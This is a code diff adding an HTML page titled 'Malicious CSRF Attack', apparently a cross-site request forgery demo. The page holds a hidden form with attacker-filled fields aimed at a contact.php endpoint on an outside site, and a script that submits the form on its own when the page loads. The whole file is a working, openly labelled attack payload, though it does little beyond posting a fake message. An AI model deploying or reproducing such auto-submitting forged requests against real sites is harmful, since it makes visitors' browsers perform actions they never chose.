@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious CSRF Attack</title>
+</head>
+<body>
+    <h1>Malicious CSRF Attack</h1>
+    <form id="csrfForm" action="http://xxc-attack.lovestoblog.com/contact.php/contact.php" method="POST">
+        <input type="hidden" name="fullname" value="Attacker's Name">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="hidden" name="message" value="This is a CSRF attack!">
+        <button type="submit">Submit</button>
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
